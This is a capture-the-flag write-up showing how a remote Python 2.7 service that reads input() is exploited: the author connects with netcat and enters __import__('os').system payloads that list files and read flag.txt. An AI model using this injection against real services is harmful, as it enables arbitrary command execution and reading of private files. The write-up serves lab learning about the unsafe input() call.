# Input as a Service
When connecting to the instance we a Python prompt.

Connected using `netcat`:
```bash=
$ nc 46.101.23.157 31020                                                                                                       4 ⚙
2.7.18 (default, Apr 20 2020, 19:51:05) 
[GCC 9.2.0]
Do you sound like an alien?
>>> 

```
From this we can see its running `Python2.7`.

If we input some bad values, we can see that it's using `input()` to get user input:
```bash=
$ nc 46.101.23.157 31020                                                                                                 148 ⨯ 4 ⚙
2.7.18 (default, Apr 20 2020, 19:51:05) 
[GCC 9.2.0]
Do you sound like an alien?
>>> 
1+2
print(input)

 3
 Traceback (most recent call last):
  File "/app/input_as_a_service.py", line 16, in <module>
    main()
  File "/app/input_as_a_service.py", line 12, in main
    text = input(' ')
  File "<string>", line 1
    print(input)
        ^
SyntaxError: invalid syntax
                                                                             
```

There is a vulnerability with `Python2` and `input()` and because of which, its recommended to use `raw_input()` instead.

[Here is a link to a Medium post that details the exploit I'm using.](https://medium.com/@abdelazimmohmmed/python-input-vulnerability-30b0bfea22c9)

But in short - input allows function calls. One function you can use is `__import__` which you can use to make execute commands on the system.

Specifically, I will use these two functions/commands:
* `__import__("os").system("ls")`
* `__import__("os").system("cat flag.txt")`

```bash=
$ nc 46.101.23.157 31020 
2.7.18 (default, Apr 20 2020, 19:51:05) 
[GCC 9.2.0]
Do you sound like an alien?
>>> 
__import__("os").system("ls")
flag.txt
input_as_a_service.py
__import__("os").system("cat flag.txt")
CHTB{4li3n5_us3_pyth0n2.X?!}

 0
 0
```